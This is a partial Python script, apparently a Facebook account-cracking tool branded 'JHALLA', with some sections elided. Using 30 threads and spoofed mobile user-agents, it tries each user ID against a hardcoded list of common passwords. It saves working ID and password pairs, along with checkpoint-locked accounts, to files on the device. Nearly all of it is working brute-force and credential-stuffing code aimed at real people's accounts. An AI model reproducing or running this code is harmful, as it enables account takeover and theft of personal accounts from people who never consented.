...
head = {"user-agent": "Mozilla/5.0 (Linux; U; Android 12; en-US; V2111 Build/SP1A.210812.003_NONFC) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.4.0.1306 Mobile Safari/537.36"}
...
usa_vivoY21= "Mozilla/5.0 (Linux; Android 12; V2111) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
ugen=[]
...
..######..##.....##.##.....##.########.########.##.....##\033[1;35mFATOO
----------------------------------------------
\033[1;37m[-] AUTHOR    :\033[1;32mJHALLA 
\033[1;37m[-] VERSION   :\033[1;32m ERROR '''JHALLA""
\033[1;37m[-] STATUS    :\033[1;32m FREE TRAIL 
--------------------------------------------
[-] ♥️MANY TERA NAAM DIL RAKH DIYA♥️
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
                ...
                if 1==1:
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print("\033[1;32m : brute has been started")
                                        print("\033[1;32m : If you show no result check your internet ")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                ...
                                os.system('xdg-open wa.me/+923435908309');menu()
                        elif xd in ['8','08']:
...
def pak():
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        print(f'\033[1;32m If you show no result check your internet')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan12','khan123456','khan123','khan786','malik123','malik786','baloch','ali786','khanbaba','kingkhan','ali123','janjan','jan123','pak123','pak786','pathan']
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [JHALLA] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
def api(ids,names,passlist):
    ...
    "user-agent": ua,
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[JHALLA-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
    ...
    "user-agent": ua,
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [JHALLA-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/JHALLA-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [JHALLA-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/JHALLA-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
